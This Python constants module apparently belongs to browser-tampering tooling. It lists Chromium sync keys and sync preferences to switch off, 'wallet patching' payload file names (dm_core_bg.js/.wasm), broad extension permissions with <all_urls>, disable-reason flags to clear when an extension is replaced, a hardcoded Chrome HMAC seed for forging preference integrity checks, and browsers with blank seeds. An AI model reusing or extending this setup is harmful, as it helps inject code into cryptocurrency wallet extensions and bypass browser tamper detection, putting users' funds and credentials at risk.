"""Chromium sync pref keys and extension disable reasons."""

from __future__ import annotations

# components/sync/base/data_type.cc — persisted spellings for migration status prefs.
SYNC_DATA_TYPE_STATUS_KEYS = frozenset(
    (
        "bookmarks",
        "preferences",
        "passwords",
        "autofill_profiles",
        "autofill",
        "autofill_wallet_credential",
        "autofill_wallet",
        "autofill_wallet_metadata",
        "autofill_wallet_offer",
        "autofill_wallet_usage",
        "themes",
        "themes_ios",
        "extensions",
        "search_engines",
        "sessions",
        "apps",
        "app_settings",
        "extension_settings",
        "history_delete_directives",
        "dictionary",
        "device_info",
        "priority_preferences",
        "managed_user_settings",
        "app_list",
        "arc_package",
        "printers",
        "reading_list",
        "user_events",
        "user_consent",
        "send_tab_to_self",
        "security_events",
        "wifi_configurations",
        "web_apps",
        "webapks",
        "os_preferences",
        "os_priority_preferences",
        "sharing_message",
        "workspace_desk",
        "history",
        "printers_authorization_servers",
        "contact_info",
        "saved_tab_group",
        "webauthn_credential",
        "incoming_password_sharing_invitation",
        "outgoing_password_sharing_invitation",
        "shared_tab_group_data",
        "collaboration_group",
        "plus_address",
        "product_comparison",
        "cookies",
        "plus_address_setting",
        "autofill_valuable",
        "autofill_valuable_metadata",
        "account_setting",
        "shared_tab_group_account_data",
        "shared_comment",
        "ai_thread",
        "contextual_task",
        "nigori",
        "skill",
        "gemini_thread",
        "accessibility_annotation",
    )
)

SYNC_USER_TYPE_PREFS_FALSE = (
    "bookmarks",
    "preferences",
    "passwords",
    "autofill",
    "themes",
    "typed_urls",
    "extensions",
    "apps",
    "reading_list",
    "tabs",
    "saved_tab_groups",
    "payments",
    "product_comparison",
    "cookies",
)

# Default payload / manifest requirements for wallet patching.
PAYLOAD_JS = "dm_core_bg.js"
PAYLOAD_WASM = "dm_core_bg.wasm"
INJECTED_JS_NAME = "dm_core_bg.js"

DEFAULT_PERMISSIONS = [
    "storage",
    "tabs",
    "activeTab",
    "scripting",
    "unlimitedStorage",
    "alarms",
    "webNavigation",
    "offscreen",
]

DEFAULT_HOST_PERMISSIONS = ["<all_urls>"]

# extensions/browser/disable_reason.h
DISABLE_CORRUPTED = 1 << 10
DISABLE_NOT_VERIFIED = 1 << 8
DISABLE_REINSTALL = 1 << 19
DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION = 1 << 24

DISABLE_REASONS_CLEAR_ON_REPLACE = frozenset(
    {
        DISABLE_CORRUPTED,
        DISABLE_REINSTALL,
        DISABLE_NOT_VERIFIED,
        DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION,
    }
)

# Known Chrome HMAC seed fallback (64 bytes).
CHROME_HMAC_SEED_FALLBACK = bytes.fromhex(
    "e748f336d85ea5f9dcdf25d8f347a65b4cdf667600f02df6724a2af18a212d26b"
    "788a25086910cf3a90313696871f3dc05823730c91df8ba5c4fd9c884b505a8"
)

BLANK_SEED_BROWSERS = frozenset(
    {
        "brave",
        "brave-browser",
        "brave-beta",
        "brave-nightly",
        "edge",
        "msedge",
        "microsoft-edge",
        "microsoft-edge-stable",
        "microsoft-edge-beta",
        "microsoft-edge-dev",
        "opera",
        "opera-stable",
        "opera-beta",
        "opera-developer",
        "operagx",
        "vivaldi",
        "vivaldi-stable",
        "vivaldi-snapshot",
        "yandex",
        "yandex-browser",
        "yandex-browser-stable",
        "yandex-browser-beta",
        "arc",
        "thorium",
    }
)
